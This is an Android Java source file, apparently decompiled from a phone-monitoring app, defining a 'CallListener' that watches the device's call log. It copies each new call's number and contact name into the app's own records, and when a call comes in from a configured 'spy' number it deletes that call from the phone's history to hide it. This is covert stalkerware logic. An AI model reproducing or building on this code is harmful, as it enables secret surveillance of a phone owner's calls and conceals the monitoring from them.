package iits.service;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import android.telephony.PhoneNumberUtils;
import iits.code.bus.Call_BUS;
import iits.code.bus.Call_History_BUS;
import iits.code.bus.Contact_History_BUS;
import iits.code.bus.Setting_BUS;
import iits.code.dto.Call_DTO;
import iits.code.dto.Setting_DTO;
import iits.mamager.FileManager;

public class CallListener extends ContentObserver {
    private static final String TAG = "CallListener";
    private ContentResolver contentResolver;
    private Context context;
    private long id;

    public CallListener(Handler handler, ContentResolver contentResolver2, Context context2) {
        super(handler);
        try {
            this.contentResolver = contentResolver2;
            this.context = context2;
            Call_DTO call = Call_History_BUS.getLastCall(contentResolver2);
            if (call == null) {
                this.id = 0;
            } else {
                this.id = call.getID();
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on CallListener function: " + e.toString());
        }
    }

    public boolean deliverSelfNotifications() {
        return false;
    }

    public void onChange(boolean arg0) {
        Call_DTO call;
        super.onChange(arg0);
        try {
            Setting_DTO setting = Setting_BUS.get(this.context);
            if (setting.getRunMode() && setting.getFlagCall() && (call = Call_History_BUS.getCallNew(this.contentResolver, this.id)) != null) {
                if (!PhoneNumberUtils.compare(call.getNumber(), setting.getSpyCallNumber()) || call.getDirection() != 1) {
                    call.setName(Contact_History_BUS.getName(this.contentResolver, call.getNumber()));
                    Call_BUS.insert(this.context, call);
                    FileManager.WriteLog(1, TAG, "insert call: " + call.getNumber() + "-" + call.getName());
                } else {
                    Call_History_BUS.delete(this.contentResolver, call.getID());
                    FileManager.WriteLog(1, TAG, "auto answer: " + call.getNumber());
                }
            }
            Call_DTO call2 = Call_History_BUS.getLastCall(this.contentResolver);
            if (call2 == null) {
                this.id = 0;
            } else {
                this.id = call2.getID();
            }
        } catch (Exception e) {
            FileManager.WriteLog(3, TAG, "Error on onChange function: " + e.toString());
        }
    }
}
